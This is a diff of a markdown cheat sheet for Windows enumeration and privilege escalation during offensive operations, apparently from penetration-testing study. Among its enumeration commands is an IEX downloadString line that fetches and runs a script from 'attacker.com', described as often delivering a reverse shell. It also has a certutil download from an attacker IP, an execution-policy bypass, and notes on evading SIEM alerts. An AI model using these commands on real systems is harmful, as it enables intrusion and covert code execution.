@@ -1,11 +1,93 @@
-# basic enumeration of windows
-- C:/windows/tasks     -   is a common (ALL) READ/WRITE directory
+# enumeration of windows environments
+
+This page serves as a reference to be used during operations. Included items are:
+
+- checklists/skeletons of common enumerations loops
+- prepared statements, ready for copy paste
+- legacy reference notes, useful for writing and for when other methods have been exhausted
+
+## default enumeration activity - noisy, lab use only
+
+1. `systeminfo`
+	1. we care about the most recent patch and build numbers
+	2. in particular note the KB hotfix number
+3. `powershell -c 'dir env:'`
+	1. userinfo 
+	2. env vars
+4. Execute the following in order, parse the ouput carefully.
+	1. `PowerUp.ps1`
+	2. `SharpUp.exe`
+	3. `WinPeasANY.exe`
+5. manual enumeration
+	1. focus on human activity
+	2. scripts, notes, custom applications
+	3. passwords written where they shoud not be
+
+
+## powershell
+
+> initial enumerations
+```powershell
+get-localuser		# lists users
+get-localgroup		# lists groups
+get-childitem -recurse -Depth 1		# nice way to get "tree" output
+get-acl FILENAME    # shows owner+other stuff on directory/object pointed at
+Get-Service | Where-Object -Property Status -eq Running # running services	 
+```
+
+> serving files
+```
+all cmd commands should work
+also `wget` is a common alias which creates the `Invoke-WebRequest` powershell equivalent
+```
+
+> find command
+```powershell
+get-childitem -force -recurse -path C:\ -errorACtion SilentlyContinue -include *SEARCH_TERM*
+# https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/ 
+```
+
+> grep equivalent; this will search entire filesystem; albeit with a lot of terminal noise
+```powershell
+Get-ChildItem C:\* -recurse | Select-String -pattern SEARCH_TERM
+```
+
+## using common scripts
+
+### Execution without touching disk
+
+1. host the `script.ps1` 
+2. edit the `script.ps1` file to call w.e. function you want by placing the function call, including arguments, at the end of this file. This is often the reverse shell.
+3. use `IEX(new-object net.webClient).downloadString('http://attacker.com/script.ps1')` 
+
+
+### Execution with touching disk 
+
+> `PowerUp.ps1` is used as an example
+
+```powershell
+-ep bypass
+import-module powerup.ps1 # or w.e u named it
+invoke-allchecks          # this is a method defined in powerup.ps1
+```
+
+
+## legacy reference  - first attempts at learning enumeration
+
+Flailing about. This section holds notes created when first studying Windows Enumeration. It is disorganized and ineffective for operations. Leaving it here to demonstrate growth and as reference for writing. Not likely to be referenced during campaigns. 
+
+bullet points
+
+- `C:/windows/tasks`     -   is a common (ALL) READ/WRITE directory
 - winPEAS exists
 - seatbelt exists
 - `find` command exists, does it ? YES
 - `cacls FILENAME`  access control lists; deprecated but sometimes has info
 
-## notable files
+
+
+### notable files
+
 > etc hosts
 ```
 c:\Windows\System32\Drivers\etc\hosts
@@ -17,8 +99,7 @@ C:\Users\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
 ```
 
 
-
-## the classics
+### the classics
 ```cmd.exe
 systeminfo
 
@@ -42,7 +123,7 @@ net account, net accounts /domain
 > note that most of these are alarmed by the SIEM, especially those which enumerate the domain. powershell equivalents might be the way to go?
 
 
-## network
+### network
 > ports in use; all, binary(name of exe), no-resolve numbers, PID
 ```
 netstat /?
@@ -72,7 +153,7 @@ c:\Windows\System32\Drivers\etc\hosts
 ```
 
 
-## cmd
+### cmd
 
 > when enumerating through RCE; particularly useful for pulling/serving with certutil
 ```
@@ -97,40 +178,3 @@ certutil -urlcache -split -f http://<MY_IP>/NAME_FILE.exe OUTFILE.exe 				; may 
 
 
 
-## powershell
-> initial enumerations
-```
-get-localuser															; lists users
-get-localgroup															; lists groups
-get-childitem -recurse -Depth 1											; nice way to get "tree" output
-get-acl FILENAME
-acl																		; shows owner+other stuff on directory/object pointed at
-Get-Service | Where-Object -Property Status -eq Running 				; current running processes	 
-```
-
-> serving files
-```
-all cmd commands should work
-also `wget` is a common alias which creates the `Invoke-WebRequest` powershell equivalent
-```
-
-
-
-> find command
-```
-get-childitem -force -recurse -path C:\ -errorACtion SilentlyContinue -include *SEARCH_TERM*
-https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/ 
-```
-
-> grep equivalent; this will search entire filesystem; albeit with a lot of terminal noise
-```
-Get-ChildItem C:\* -recurse | Select-String -pattern SEARCH_TERM
-```
-
-## using common scripts
-### PowerUp.ps1
-```powershell
--ep bypass
-import-module powerup.ps1 # or w.e u named it
-invoke-allchecks          # this is a method defined in powerup.ps1
-```
